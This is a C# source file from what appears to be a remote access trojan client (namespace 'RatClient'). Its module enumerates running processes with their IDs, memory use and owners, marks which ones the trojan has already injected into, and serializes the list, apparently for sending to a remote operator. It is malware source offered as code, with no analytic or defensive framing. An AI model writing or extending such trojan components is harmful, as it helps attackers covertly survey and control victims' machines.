using System.Diagnostics;
using System.Linq;
using System.Collections.Generic;
using System.Security.Cryptography;
using System;


namespace RatClient.ProcManage
{
    class ProcInfo
    {
        public static byte[] GetFormatedProcesses()
        {
            var sortedProcesses = Process.GetProcesses().OrderBy(p => p.ProcessName);
            var res = new List<string[]>();

            foreach (Process process in sortedProcesses)
            {
                string identifier;
                try
                {
                    identifier = GenIdentifier(process);
                }
                catch
                {
                    continue;
                }

                string wasInject = WasInject(identifier) ? "y" : "x";
                res.Add(new string[]
                {
            process.ProcessName,
            process.Id.ToString(),
            process.WorkingSet64.ToString(),
            Tools.GetOwnerByPid((uint)process.Id),
            wasInject
                });
            }

            Console.WriteLine("End Processing Data");
            byte[] serializedData = Tools.SerializeToJson(res.ToArray());
            Console.WriteLine("Sent!");
            return serializedData;
        }

        private static bool WasInject(string identifier)
        {
            return Info.InjectedProcess.Contains(identifier);
        }

        public static string GenIdentifier(Process process)
        {
            MD5 md5 = MD5.Create();
            string identifier = $"{process.Id}:{process.StartTime}";
            return Convert.ToBase64String(md5.ComputeHash(System.Text.Encoding.ASCII.GetBytes(identifier)));
        }
    }
}
